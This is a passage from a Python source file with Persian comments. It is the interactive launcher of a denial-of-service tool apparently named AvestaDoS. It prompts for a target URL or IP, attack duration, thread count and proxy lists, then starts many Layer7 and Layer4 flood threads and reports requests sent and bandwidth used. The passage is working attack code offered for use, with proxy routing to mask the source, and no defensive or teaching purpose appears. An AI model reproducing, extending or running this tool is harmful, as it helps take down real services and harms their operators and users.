    duration = int(duration_input) if duration_input else 60
    
    # ۳. دریافت تعداد تردها
    threads_input = input(
        f"{Colors.BOLD}{Colors.OKCYAN}🧵 Threads (default 50): {Colors.RESET}"
    ).strip()
    threads = int(threads_input) if threads_input else 50
    
    # ۴. دریافت RPC
    rpc_input = input(
        f"{Colors.BOLD}{Colors.OKCYAN}📨 RPC (Requests Per Connection, default 5): {Colors.RESET}"
    ).strip()
    rpc = int(rpc_input) if rpc_input else 5
    
    # ۵. دریافت timeout
    timeout_input = input(
        f"{Colors.BOLD}{Colors.OKCYAN}⏰ Timeout (default 0.9): {Colors.RESET}"
    ).strip()
    timeout = float(timeout_input) if timeout_input else 0.9
    
    # ============================================================
    # 🔥 انتخاب متدهای حمله
    # ============================================================
    
    print(f"\n{Colors.BOLD}{Colors.OKCYAN}{'─'*50}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.OKGREEN}  SELECT ATTACK METHODS{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.OKCYAN}{'─'*50}{Colors.RESET}\n")
    
    # نمایش متدهای لایه ۷
    print(f"{Colors.BOLD}{Colors.HEADER}📋 Layer7 Methods ({len(AttackMethods.LAYER7_METHODS)} methods):{Colors.RESET}")
    l7_sorted = sorted(AttackMethods.LAYER7_METHODS)
    for i in range(0, len(l7_sorted), 6):
        chunk = l7_sorted[i:i+6]
        print(f"  {Colors.OKCYAN}{', '.join(chunk)}{Colors.RESET}")
    
    print()
    
    # نمایش متدهای لایه ۴
    print(f"{Colors.BOLD}{Colors.HEADER}📋 Layer4 Methods ({len(AttackMethods.LAYER4_METHODS)} methods):{Colors.RESET}")
    l4_sorted = sorted(AttackMethods.LAYER4_METHODS)
    for i in range(0, len(l4_sorted), 6):
        chunk = l4_sorted[i:i+6]
        print(f"  {Colors.OKCYAN}{', '.join(chunk)}{Colors.RESET}")
    
    print(f"\n{Colors.BOLD}{Colors.OKCYAN}{'─'*50}{Colors.RESET}")
    print(f"  {Colors.BOLD}1.{Colors.RESET} ALL Layer7 + Layer4 ({len(AttackMethods.ALL_METHODS)} methods)")
    print(f"  {Colors.BOLD}2.{Colors.RESET} Only Layer7 ({len(AttackMethods.LAYER7_METHODS)} methods)")
    print(f"  {Colors.BOLD}3.{Colors.RESET} Only Layer4 ({len(AttackMethods.LAYER4_METHODS)} methods)")
    print(f"  {Colors.BOLD}4.{Colors.RESET} Custom Selection (comma-separated methods)")
    print(f"  {Colors.BOLD}5.{Colors.RESET} Single method\n")
    
    choice = input(f"{Colors.BOLD}{Colors.OKCYAN}[?] Choice (1-5, default 1): {Colors.RESET}").strip() or "1"
    
    selected_l7 = set()
    selected_l4 = set()
    
    if choice == "1":
        selected_l7 = AttackMethods.LAYER7_METHODS.copy()
        selected_l4 = AttackMethods.LAYER4_METHODS.copy()
        print(f"{EMOJI['check']} Selected ALL methods")
        
    elif choice == "2":
        selected_l7 = AttackMethods.LAYER7_METHODS.copy()
        print(f"{EMOJI['check']} Selected Layer7 only")
        
    elif choice == "3":
        selected_l4 = AttackMethods.LAYER4_METHODS.copy()
        print(f"{EMOJI['check']} Selected Layer4 only")
        
    elif choice == "4":
        custom_input = input(
            f"{Colors.BOLD}{Colors.OKCYAN}[?] Enter method names (comma-separated): {Colors.RESET}"
        ).strip().upper()
        
        if not custom_input:
            logger.error(f"{EMOJI['cross']} متدی انتخاب نشد!")
            return
            
        selected_methods = [m.strip() for m in custom_input.split(',') if m.strip()]
        
        for method in selected_methods:
            if method in AttackMethods.LAYER7_METHODS:
                selected_l7.add(method)
            elif method in AttackMethods.LAYER4_METHODS:
                selected_l4.add(method)
            else:
                logger.warning(f"{EMOJI['warning']} متد '{method}' معتبر نیست. نادیده گرفته شد.")
        
        if not selected_l7 and not selected_l4:
            logger.error(f"{EMOJI['cross']} هیچ متد معتبری انتخاب نشد!")
            return
            
        print(f"{EMOJI['check']} Selected: {len(selected_l7)} L7 + {len(selected_l4)} L4 methods")
        
    elif choice == "5":
        method_input = input(
            f"{Colors.BOLD}{Colors.OKCYAN}[?] Enter method name: {Colors.RESET}"
        ).strip().upper()
        
        if not method_input:
            logger.error(f"{EMOJI['cross']} متدی انتخاب نشد!")
            return
            
        if method_input in AttackMethods.LAYER7_METHODS:
            selected_l7.add(method_input)
            print(f"{EMOJI['check']} Selected: {method_input} (Layer7)")
        elif method_input in AttackMethods.LAYER4_METHODS:
            selected_l4.add(method_input)
            print(f"{EMOJI['check']} Selected: {method_input} (Layer4)")
        else:
            logger.error(f"{EMOJI['cross']} متد '{method_input}' معتبر نیست!")
            return
    
    # ============================================================
    # 🔥 تنظیمات پروکسی
    # ============================================================
    
    use_proxy = input(
        f"\n{Colors.BOLD}{Colors.OKCYAN}🌐 Use proxies? (y/n, default n): {Colors.RESET}"
    ).strip().lower() == 'y'
    
    proxy_file = None
    proxy_type = 0
    
    if use_proxy:
        proxy_type_input = input(
            f"{Colors.BOLD}{Colors.OKCYAN}[?] Proxy type (1=HTTP, 4=SOCKS4, 5=SOCKS5, 0=ALL): {Colors.RESET}"
        ).strip()
        proxy_type = int(proxy_type_input) if proxy_type_input else 0
        
        proxy_filename = input(
            f"{Colors.BOLD}{Colors.OKCYAN}[?] Proxy filename (default proxies.txt): {Colors.RESET}"
        ).strip() or "proxies.txt"
        proxy_file = Path(proxy_filename)
    
    # ============================================================
    # 🔥 نمایش خلاصه تنظیمات
    # ============================================================
    
    print(f"\n{Colors.BOLD}{Colors.OKCYAN}{'═'*50}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.OKGREEN}📊 خلاصه تنظیمات حمله{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.OKCYAN}{'═'*50}{Colors.RESET}")
    print(f"  {Colors.OKBLUE}🎯 هدف:{Colors.RESET} {urlraw}")
    print(f"  {Colors.OKBLUE}⏱️  مدت:{Colors.RESET} {duration} ثانیه")
    print(f"  {Colors.OKBLUE}🧵 تردها:{Colors.RESET} {threads}")
    print(f"  {Colors.OKBLUE}📨 RPC:{Colors.RESET} {rpc}")
    print(f"  {Colors.OKBLUE}⏰ Timeout:{Colors.RESET} {timeout}s")
    print(f"  {Colors.OKBLUE}📋 متدهای L7:{Colors.RESET} {len(selected_l7)}")
    print(f"  {Colors.OKBLUE}📋 متدهای L4:{Colors.RESET} {len(selected_l4)}")
    if use_proxy and proxy_file:
        print(f"  {Colors.OKBLUE}🌐 پروکسی:{Colors.RESET} {proxy_file} (نوع {proxy_type})")
    else:
        print(f"  {Colors.OKBLUE}🌐 پروکسی:{Colors.RESET} غیرفعال")
    print(f"{Colors.BOLD}{Colors.OKCYAN}{'═'*50}{Colors.RESET}\n")
    
    # تأیید نهایی
    confirm = input(f"{Colors.BOLD}{Colors.WARNING}🚀 شروع حمله؟ (y/n، پیش‌فرض y): {Colors.RESET}").strip().lower()
    if confirm == 'n':
        print(f"{Colors.FAIL}❌ حمله لغو شد.{Colors.RESET}")
        return
    
    print(f"\n{Colors.BOLD}{Colors.OKGREEN}{'═'*50}{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.OKGREEN}  🚀 STARTING ATTACK{Colors.RESET}")
    print(f"{Colors.BOLD}{Colors.OKGREEN}{'═'*50}{Colors.RESET}\n")
    
    # ============================================================
    # 🔥 ترکیب متدها و شروع حمله
    # ============================================================
    
    all_methods = list(selected_l7) + list(selected_l4)
    
    if not all_methods:
        logger.error(f"{EMOJI['cross']} هیچ متدی برای حمله وجود ندارد!")
        return
    
    # توزیع تردها بین متدها
    total_threads = len(all_methods) * threads
    threads_per_method = threads
    
    if len(all_methods) > 1:
        threads_per_method = max(1, total_threads // len(all_methods))
    
    print(f"{Colors.OKCYAN}🔹 متدها: {', '.join(all_methods)}{Colors.RESET}")
    print(f"{Colors.OKCYAN}🔹 ترد در هر متد: {threads_per_method}{Colors.RESET}")
    print(f"{Colors.OKCYAN}🔹 کل تردها: {len(all_methods) * threads_per_method}{Colors.RESET}\n")
    
    # ایجاد Event برای هماهنگی
    event = Event()
    
    try:
        # تشخیص نوع هدف (لایه ۷ یا ۴)
        if '://' in urlraw or ('.' in urlraw and ':' not in urlraw):
            # لایه ۷
            target_url = URL(urlraw)
            try:
                host_ip = gethostbyname(target_url.host)
            except:
                host_ip = target_url.host
            
            uagents = set(_DEFAULT_USERAGENTS)
            referers = set(_DEFAULT_REFERERS)
            
            attacks = []
            
            # ایجاد حملات لایه ۷
            for method in selected_l7:
                for _ in range(threads_per_method):
                    attack = Layer7Attack(
                        target_url,
                        method,
                        AttackConfig(
                            method=method,
                            target=urlraw,
                            duration=duration,
                            threads=threads,
                            rpc=rpc,
                            timeout=timeout,
                            proxy_type=proxy_type,
                            proxy_file=proxy_file if use_proxy else None,
                            use_proxy=use_proxy,
                            verbose=False
                        ),
                        event,
                        uagents,
                        referers,
                        None
                    )
                    attacks.append(attack)
            
            # ایجاد حملات لایه ۴
            for method in selected_l4:
                for _ in range(threads_per_method):
                    attack = Layer4Attack(
                        host_ip,
                        target_url.port or 80,
                        method,
                        AttackConfig(
                            method=method,
                            target=urlraw,
                            duration=duration,
                            threads=threads,
                            rpc=rpc,
                            timeout=timeout,
                            proxy_type=proxy_type,
                            proxy_file=proxy_file if use_proxy else None,
                            use_proxy=use_proxy,
                            verbose=False
                        ),
                        event,
                        None,
                        47
                    )
                    attacks.append(attack)
            
        else:
            # لایه ۴
            parts = urlraw.split(':')
            target_ip = parts[0]
            target_port = int(parts[1]) if len(parts) > 1 else 80
            
            attacks = []
            
            for method in selected_l4:
                for _ in range(threads_per_method):
                    attack = Layer4Attack(
                        target_ip,
                        target_port,
                        method,
                        AttackConfig(
                            method=method,
                            target=urlraw,
                            duration=duration,
                            threads=threads,
                            rpc=rpc,
                            timeout=timeout,
                            proxy_type=proxy_type,
                            proxy_file=proxy_file if use_proxy else None,
                            use_proxy=use_proxy,
                            verbose=False
                        ),
                        event,
                        None,
                        47
                    )
                    attacks.append(attack)
        
        # ============================================================
        # 🔥 شروع حملات
        # ============================================================
        
        print(f"{Colors.OKGREEN}▶ شروع {len(attacks)} ترد حمله...{Colors.RESET}\n")
        
        # شروع همه حملات
        for attack in attacks:
            attack.start()
        
        # سیگنال شروع
        event.set()
        
        # ============================================================
        # 🔥 نمایش پیشرفت (به سبک اولیه AvestaDoS)
        # ============================================================
        
        start_time = time()
        
        try:
            if RICH_AVAILABLE:
                # استفاده از rich برای نمایش پیشرفت
                from rich.progress import Progress, BarColumn, TextColumn, TimeRemainingColumn
                from rich.console import Console
                
                console = Console()
                
                with Progress(
                    TextColumn("[progress.description]{task.description}"),
                    BarColumn(),
                    TextColumn("[progress.percentage]{task.percentage:>3.0f}%"),
                    TimeRemainingColumn(),
                    console=console
                ) as progress_bar:
                    task = progress_bar.add_task(
                        f"[cyan]حمله به {urlraw}...", 
                        total=duration
                    )
                    
                    while progress_bar.tasks[task].completed < duration and event.is_set():
                        # جمع‌آوری آمار
                        total_requests = 0
                        total_bytes = 0
                        total_errors = 0
                        
                        for attack in attacks:
                            stats = attack.stats
                            total_requests += stats["requests"]
                            total_bytes += stats["bytes"]
                            total_errors += stats["errors"]
                        
                        elapsed = time() - start_time
                        
                        progress_bar.update(
                            task,
                            description=f"[cyan]درخواست‌ها: {total_requests:,} | "
                                       f"بایت: {humanbytes(total_bytes)} | "
                                       f"خطا: {total_errors} | "
                                       f"تردهای فعال: {len([a for a in attacks if a.is_alive()])}",
                            completed=elapsed
                        )
                        
                        # بررسی اینکه آیا زمان تمام شده
                        if elapsed >= duration:
                            break
                            
                        sleep(0.5)
                    
                    # توقف حمله
                    event.clear()
                    for attack in attacks:
                        attack.stop()
                    
                    # نمایش آمار نهایی در rich
                    total_requests = 0
                    total_bytes = 0
                    total_errors = 0
                    
                    for attack in attacks:
                        stats = attack.stats
                        total_requests += stats["requests"]
                        total_bytes += stats["bytes"]
                        total_errors += stats["errors"]
                    
                    progress_bar.update(
                        task,
                        description=f"[green]✅ حمله به پایان رسید! درخواست‌ها: {total_requests:,} | "
                                   f"بایت: {humanbytes(total_bytes)} | خطا: {total_errors}",
                        completed=duration
                    )
                    
            else:
                # نمایش پیشرفت ساده (بدون rich)
                try:
                    while time() - start_time < duration and event.is_set():
                        # جمع‌آوری آمار
                        total_requests = 0
                        total_bytes = 0
                        total_errors = 0
                        
                        for attack in attacks:
                            stats = attack.stats
                            total_requests += stats["requests"]
                            total_bytes += stats["bytes"]
                            total_errors += stats["errors"]
                        
                        elapsed = time() - start_time
                        progress = min(elapsed / duration * 100, 100)
                        
                        # نوار پیشرفت ساده
                        bar_len = 30
                        filled = int(bar_len * progress / 100)
                        bar = '█' * filled + '░' * (bar_len - filled)
                        
                        print(f"\r{EMOJI['chart']} {bar} {progress:.1f}% | "
                              f"درخواست‌ها: {total_requests:,} | "
                              f"بایت: {humanbytes(total_bytes)} | "
                              f"خطا: {total_errors} | "
                              f"زمان: {elapsed:.1f}s", end='')
                        
                        sleep(1)
                        
                        if elapsed >= duration:
                            break
                    
                    print()  # خط جدید
                    
                except KeyboardInterrupt:
                    pass
                
                finally:
                    # توقف حمله
                    event.clear()
                    for attack in attacks:
                        attack.stop()
                    
                    # نمایش آمار نهایی
                    total_requests = 0
                    total_bytes = 0
                    total_errors = 0
                    
                    for attack in attacks:
                        stats = attack.stats
                        total_requests += stats["requests"]
                        total_bytes += stats["bytes"]
                        total_errors += stats["errors"]
                    
                    elapsed = time() - start_time
                    
                    print(f"\n{Colors.BOLD}{Colors.OKGREEN}{'═'*50}{Colors.RESET}")
                    print(f"{Colors.BOLD}{Colors.OKGREEN}✅ حمله به پایان رسید!{Colors.RESET}")
                    print(f"{Colors.BOLD}{Colors.OKGREEN}{'═'*50}{Colors.RESET}")
                    print(f"  {EMOJI['chart']} درخواست‌های ارسال‌شده: {total_requests:,}")
                    print(f"  {EMOJI['file']} داده‌های ارسال‌شده: {humanbytes(total_bytes)}")
                    print(f"  {EMOJI['cross']} خطاها: {total_errors}")
                    print(f"  {EMOJI['clock']} مدت زمان: {elapsed:.2f} ثانیه")
                    if elapsed > 0:
                        print(f"  {EMOJI['bolt']} نرخ متوسط: {humanformat(int(total_requests / elapsed))} req/s")
                        print(f"  {EMOJI['fire']} پهنای باند: {humanbytes(int(total_bytes / elapsed))}/s")
                    print(f"{Colors.BOLD}{Colors.OKGREEN}{'═'*50}{Colors.RESET}\n")
                    
        except KeyboardInterrupt:
            print(f"\n\n{Colors.WARNING}⚠️ حمله توسط کاربر متوقف شد.{Colors.RESET}")
            event.clear()
            for attack in attacks:
                attack.stop()
            
    except KeyboardInterrupt:
        print(f"\n\n{Colors.WARNING}⚠️ برنامه توسط کاربر متوقف شد.{Colors.RESET}")
        event.clear()
        
    except Exception as e:
        logger.error(f"{EMOJI['cross']} خطا: {e}")
        event.clear()


if __name__ == "__main__":
    main()

# =============================================================================
# پایان فایل
# =============================================================================